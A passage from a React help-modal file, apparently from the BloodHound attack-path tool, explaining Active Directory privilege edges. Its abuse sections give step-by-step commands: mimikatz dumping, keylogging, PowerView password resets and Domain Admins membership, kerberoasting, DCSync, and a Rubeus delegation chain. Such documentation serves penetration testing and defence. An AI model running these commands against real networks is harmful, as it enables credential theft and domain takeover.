import React, { Component } from 'react';

import { Modal, Tabs, Tab } from 'react-bootstrap';
import { encode } from 'he';

export default class HelpModal extends Component {
    constructor() {
        super();

        this.state = {
            open: false,
            infoTabContent: '',
            abuseTabContent: '',
            opsecTabContent: '',
            referencesTabContent: '',
        };
    }

    componentDidMount() {
        emitter.on('displayHelp', this.openModal.bind(this));
    }

    closeModal() {
        this.setState({ open: false });
    }

    groupSpecialFormat(source) {
        if (source.type === 'Group') {
            return 'The members of the {} {} have';
        } else {
            return 'The {} {} has';
        }
    }

    createGeneralInfoTab(edge, source, target) {
        let sourceType = source.type.toLowerCase();
        let sourceName = encode(source.label);
        let targetType = target.type.toLowerCase();
        let targetName = encode(target.label);
        let formatted;
        if (edge.label === 'AdminTo') {
            let text = `${this.groupSpecialFormat(
                source
            )} admin rights to the computer {}.

            By default, administrators have several ways to perform remote code execution on Windows systems, including via RDP, WMI, WinRM, the Service Control Manager, and remote DCOM execution.
        
            Further, administrators have several options for impersonating other users logged onto the system, including plaintext password extraction, token impersonation, and injecting into processes running as another user.
        
            Finally, administrators can often disable host-based security controls that would otherwise prevent the aforementioned techniques.`;
            formatted = text.format(sourceType, sourceName, targetName);
        } else if (edge.label === 'MemberOf') {
            let text = `The {} {} is a member of the group {}.
            
            Groups in active directory grant their members any privileges the group itself has. If a group has rights to another principal, users/computers in the group, as well as other groups inside the group inherit those permissions.`;
            formatted = text.format(sourceType, sourceName, targetName);
        } else if (edge.label === 'HasSession') {
            let text = `The {} {} has a session on the computer {}.
            
            When a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user's process.
            
            Any user that is an administrator to the system has the capability to retrieve the credential material from memory if it still exists.
            
            Note: A session does not guarantee credential material is present, only possible.`;
            formatted = text.format(targetType, targetName, sourceName);
        } else if (edge.label === 'AllExtendedRights') {
            let text = `${this.groupSpecialFormat(
                source
            )} the AllExtendedRights privilege to the {} {}. Extended rights are special rights granted on objects which allow reading of privileged attributes, as well as performing special actions. `;
            formatted = text.format(
                sourceType,
                sourceName,
                targetType,
                targetName
            );
        } else if (edge.label === 'AddMember') {
            let text = `${this.groupSpecialFormat(
                source
            )} the ability to add arbitrary principals, including {}, to the group {}. Because of security group delegation, the members of a security group have the same privileges as that group. 
            
            By adding itself to the group, {} will gain the same privileges that {} already has.`;
            formatted = text.format(
                sourceType,
                sourceName,
                sourceType === 'group' ? 'themselves' : 'itself',
                targetName,
                sourceName,
                targetName
            );
        } else if (edge.label === 'ForceChangePassword') {
            let text = `${this.groupSpecialFormat(
                source
            )} the capability to change the user {}'s password without knowing that user's current password.`;
            formatted = text.format(sourceType, sourceName, targetName);
        } else if (edge.label === 'GenericAll') {
            let text = `${this.groupSpecialFormat(
                source
            )} GenericAll privileges to the {} {}. This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.`;
            formatted = text.format(
                sourceType,
                sourceName,
                targetType,
                targetName
            );
        } else if (edge.label === 'GenericWrite') {
            let text = `${this.groupSpecialFormat(
                source
            )} generic write access to the {} {}. 
            
            Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user`;
            formatted = text.format(
                sourceType,
                sourceName,
                targetType,
                targetName
            );
        } else if (edge.label === 'Owns') {
            let text = `${this.groupSpecialFormat(
                source
            )} ownership of the {} {}. Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL`;
            formatted = text.format(
                sourceType,
                sourceName,
                targetType,
                targetName
            );
        } else if (edge.label === 'WriteDacl') {
            let text = `${this.groupSpecialFormat(
                source
            )} permissions to modify the DACL (Discretionary Access Control List) on the {} {}. With write access to the target object's DACL, you can grant yourself any privilege you want on the object.`;
            formatted = text.format(
                sourceType,
                sourceName,
                targetType,
                targetName
            );
        } else if (edge.label === 'WriteOwner') {
            let text = `${this.groupSpecialFormat(
                source
            )} the ability to modify the owner of the {} {}. Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.`;
            formatted = text.format(
                sourceType,
                sourceName,
                targetType,
                targetName
            );
        } else if (edge.label === 'CanRDP') {
            let text = `${this.groupSpecialFormat(
                source
            )} the capability to create a Remote Desktop Connection with the computer {}.
            
            Remote Desktop access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.
            
            Note: This edge does not guarantee privileged execution.`;
            formatted = text.format(sourceType, sourceName, targetName);
        } else if (edge.label === 'ExecuteDCOM') {
            let text = `${this.groupSpecialFormat(
                source
            )} membership in the Distributed COM Users local group on the computer {}. This can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods.`;
            formatted = text.format(sourceType, sourceName, targetName);
        } else if (edge.label === 'AllowedToDelegate') {
            let text = `The {} {} has the constrained delegation privilege to the computer {}.
            
            The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. That is, a node with this privilege can impersonate any domain principal (including Domain Admins) to the specific service on the target host. One caveat- impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked.
            
            An issue exists in the constrained delegation where the service name (sname) of the resulting ticket is not a part of the protected ticket information, meaning that an attacker can modify the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo is “HTTP/host.domain.com”, tickets can be modified for LDAP/HOST/etc. service names, resulting in complete server compromise, regardless of the specific service listed.`;
            formatted = text.format(sourceType, sourceName, targetName);
        } else if (edge.label === 'GetChanges') {
            let text = `${this.groupSpecialFormat(
                source
            )} the DS-Replication-Get-Changes privilege on the domain ${targetName}.
            
            Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes-All, a principal may perform a DCSync attack.`;
            formatted = text.format(sourceType, sourceName, targetName);
        } else if (edge.label === 'GetChangesAll') {
            let text = `${this.groupSpecialFormat(
                source
            )} the DS-Replication-Get-Changes-All privilege on the domain ${targetName}.
            
            Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes, a principal may perform a DCSync attack.`;
            formatted = text.format(sourceType, sourceName, targetName);
        } else if (edge.label === 'ReadLAPSPassword') {
            let text = `${this.groupSpecialFormat(
                source
            )} the ability to read the password set by Local Administrator Password Solution (LAPS) on the computer {}. The local administrator password for a computer managed by LAPS is stored in the confidential LDAP attribute,  “ms-mcs-AdmPwd”. `;

            formatted = text.format(
                sourceType,
                sourceName,
                targetType,
                targetName
            );
        } else if (edge.label === 'Contains') {
            formatted = `The ${sourceType} ${sourceName} contains the ${targetType} ${targetName}. GPOs linked to a container apply to all objects that are contained by the container.`;
        } else if (edge.label === 'GpLink') {
            formatted = `The GPO ${sourceName} is linked to the ${targetType} ${targetName}. A linked GPO applies its settings to objects in the linked container.`;
        } else if (edge.label === 'AddAllowedToAct') {
            let text = `${this.groupSpecialFormat(
                source
            )} can modify the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer ${targetName}.
            
            The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object.
            
            If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.
            
            One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service pricipal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.`;

            formatted = text.format(
                sourceType,
                sourceName,
                targetType,
                targetName
            );
        } else if (edge.label === 'AllowedToAct') {
            let text = `${this.groupSpecialFormat(
                source
            )} is added to the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer ${targetName}.
            
            An attacker can use this account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.
            
            One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service pricipal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.`;

            formatted = text.format(
                sourceType,
                sourceName,
                targetType,
                targetName
            );
        } else if (edge.label === 'SQLAdmin') {
            formatted = `The user ${sourceName} is a SQL admin on the computer ${targetName}.

            There is at least one MSSQL instance running on ${targetName} where the user ${sourceName} is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques.

            For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of "MSSQLSvc" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.
            
            Author: Scott Sutherland`;
        }

        this.setState({ infoTabContent: { __html: formatted } });
    }

    createAbuseInfoTab(edge, source, target) {
        let sourceType = source.type;
        let sourceName = encode(source.label);
        let targetType = target.type;
        let targetName = encode(target.label);
        let formatted;
        if (edge.label === 'AdminTo') {
            let text = `<h4>Lateral movement</h4>
            There are several ways to pivot to a Windows system. If using Cobalt Strike's beacon, check the help info for the commands "psexec", "psexec_psh", "wmi", and "winrm". With Empire, consider the modules for Invoke-PsExec, Invoke-DCOM, and Invoke-SMBExec. With Metasploit, consider the modules "exploit/windows/smb/psexec", "exploit/windows/winrm/winrm_script_exec", and "exploit/windows/local/ps_wmi_exec". Additionally, there are several manual methods for remotely executing code on the machine, including via RDP, with the service control binary and interaction with the remote machine's service control manager, and remotely instantiating DCOM objects. For more information about these lateral movement techniques, see the References tab.
            
            <h4>Gathering credentials</h4>
            The most well-known tool for gathering credentials from a Windows system is mimikatz. mimikatz is built into several agents and toolsets, including Cobalt Strike's beacon, Empire, and Meterpreter. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system.
            
            You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter's "keyscan_start" command to start keylogging a user, then "keyscan_dump" to return the captured keystrokes. Or, you may use PowerSploit's Invoke-ClipboardMonitor to periodically gather the contents of the user's clipboard.
            
            <h4>Token Impersonation</h4>
            You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab.
            
            <h4>Disabling host-based security controls</h4>
            Several host-based controls may affect your ability to execute certain techniques, such as credential theft, process injection, command line execution, and writing files to disk. Administrators can often disable these host-based controls in various ways, such as stopping or otherwise disabling a service, unloading a driver, or making registry key changes. For more information, see the References tab.`;
            formatted = text.format(sourceType, sourceName, targetName);
        } else if (edge.label === 'MemberOf') {
            let text = `No abuse is necessary. This edge simply indicates that a principal belongs to a security group.`;
            formatted = text;
        } else if (edge.label === 'HasSession') {
            let text = `<h4>Password Theft</h4>
            When a user has a session on the computer, you may be able to obtain credentials for the user via credential dumping or token impersonation. You must be able to move laterally to the computer, have administrative access on the computer, and the user must have a non-network logon session on the computer.

            Once you have established a Cobalt Strike Beacon, Empire agent, or other implant on the target, you can use mimikatz to dump credentials of the user that has a session on the computer. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system.

            You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter's "keyscan_start" command to start keylogging a user, then "keyscan_dump" to return the captured keystrokes. Or, you may use PowerSploit's Invoke-ClipboardMonitor to periodically gather the contents of the user's clipboard.
                
            <h4>Token Impersonation</h4>            
            You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab.

            User sessions can be short lived and only represent the sessions that were present at the time of collection. A user may have ended their session by the time you move to the computer to target them. However, users tend to use the same machines, such as the workstations or servers they are assigned to use for their job duties, so it can be valuable to check multiple times if a user session has started.`;
            formatted = text;
        } else if (edge.label === 'AllExtendedRights') {
            let text;
            if (targetType === 'User') {
                text = `The AllExtendedRights privilege grants ${sourceName} the ability to change the password of the user ${targetName} without knowing their current password. This is equivalent to the “ForceChangePassword” edge in BloodHound.

                There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

                To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then create a secure string object for the password you want to set on the target user:

                <code>$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code>

                Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred</code>

                Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.`;
            } else if (targetType === 'Computer') {
                if (target.haslaps) {
                    text = `The AllExtendedRights privilege grants ${sourceName} the ability to obtain the RID 500 administrator password of ${targetName}. ${sourceName} can do so by listing a computer object’s AD properties with PowerView using Get-DomainComputer {}.  The value of the ms-mcs-AdmPwd property will contain password of the administrative local account on ${targetName}.`;
                } else {
                    text = `This ACE is not exploitable under current conditions. Please report this bug to the BloodHound developers`;
                }
            } else if (targetType === 'Domain') {
                text = `The AllExtendedRights privilege grants ${sourceName} both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ${targetName}. This can be abused using the lsadump::dcsync command in mimikatz.`;
            }
            formatted = text;
        } else if (edge.label === 'AddMember') {
            let text = `There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" dfm.a /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

            To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                sourceType === 'User'
                    ? `${sourceName} if you are not running a process as that user`
                    : `a member of ${sourceName} if you are not running a process as a member`
            } if you are not running a process as that user. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):
        
            <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
            $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
        
            Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ${sourceName}:
        
            <code>Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred</code>
        
            Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:
        
            <code>Get-DomainGroupMember -Identity 'Domain Admins'</code>`;
            formatted = text;
        } else if (edge.label === 'ForceChangePassword') {
            let text = `There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

            To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                sourceType === 'User'
                    ? `${sourceName} if you are not running a process as that user`
                    : `a member of ${sourceName} if you are not running a process as a member`
            }. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):

            <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
            $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

            Then create a secure string object for the password you want to set on the target user:

            <code>$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code>

            Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ${sourceName}:

            <code>Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred</code>

            Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.`;
            formatted = text;
        } else if (edge.label === 'GenericAll') {
            let text;
            if (targetType === 'Group') {
                text = `Full control of a group allows you to directly modify group membership of the group. 

                There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally,  you have much safer execution options than you do with spawning net.exe (see the opsec tab).

                To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred</code>

                Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:

                <code>Get-DomainGroupMember -Identity 'Domain Admins'</code>`;
            } else if (targetType === 'User') {
                text = `Full control of a user allows you to modify properties of the user to perform a targeted kerberoast attack, and also grants the ability to reset the password of the user without knowing their current one.

                <h4> Targeted Kerberoast </h4>
                A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket. 

                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}</code>

                After running this, you can use Get-DomainSPNTicket as follows:
                    
                <code>Get-DomainSPNTicket -Credential $Cred harmj0y | fl</code>

                The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:

                <code>Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname</code>

                <h4> Force Change Password </h4>
                There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

                To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then create a secure string object for the password you want to set on the target user:

                <code>$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code>

                Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred</code>

                Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.`;
            } else if (targetType === 'Computer') {
                if (target.haslaps) {
                    text = `Full control of a computer object is abusable when the computer’s local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object’s security descriptor.
                    
                    Alternatively, Full control of a computer object can be used to perform a resource based constrained delegation attack. 
                    
                    Abusing this primitive is currently only possible through the Rubeus project.
                
                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
                    
                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
                    
                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
                    
                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
                    
                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
                    
                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
                    $SD.GetBinaryForm($SDBytes, 0)</code>
                    
                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                    
                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                    
                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                    
                    <code>Rubeus.exe hash /password:Summer2018!</code>
                    
                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
                    
                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>`;
                } else {
                    text = `Full control of a computer object can be used to perform a resource based constrained delegation attack. 
                    
                    Abusing this primitive is currently only possible through the Rubeus project.
                
                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
                    
                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
                    
                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
                    
                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
                    
                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
                    
                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
                    $SD.GetBinaryForm($SDBytes, 0)</code>
                    
                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                    
                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                    
                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                    
                    <code>Rubeus.exe hash /password:Summer2018!</code>
                    
                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
                    
                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>`;
                }
            } else if (targetType === 'Domain') {
                text = `Full control of a domain object grants you both DS-Replication-Get-Changes as well as DS-Replication-Get-Changes-All rights. The combination of these rights allows you to perform the dcsync attack using mimikatz. To grab the credential of the user harmj0y using these rights:

                <code>sekurlsa::dcsync /domain:testlab.local /user:harmj0y</code>`;
            } else if (targetType === 'GPO') {
                text = `With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse`;
            }
            formatted = text;
        } else if (edge.label === 'GenericWrite') {
            let text;
            if (targetType === 'Group') {
                text = `GenericWrite to a group allows you to directly modify group membership of the group.

                There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally,  you have much safer execution options than you do with spawning net.exe (see the opsec tab).

                To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred</code>

                Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:

                <code>Get-DomainGroupMember -Identity 'Domain Admins'</code>`;
            } else if (targetType === 'User') {
                text = `A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket. 

                You may need to authenticate to the Domain Controller as ${
                    sourceType === 'User'
                        ? `${sourceName} if you are not running a process as that user`
                        : `a member of ${sourceName} if you are not running a process as a member`
                }. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>

                Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ${sourceName}:

                <code>Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}</code>

                After running this, you can use Get-DomainSPNTicket as follows:
                    
                <code>Get-DomainSPNTicket -Credential $Cred harmj0y | fl</>

                The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:

                <code>Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname</code>`;
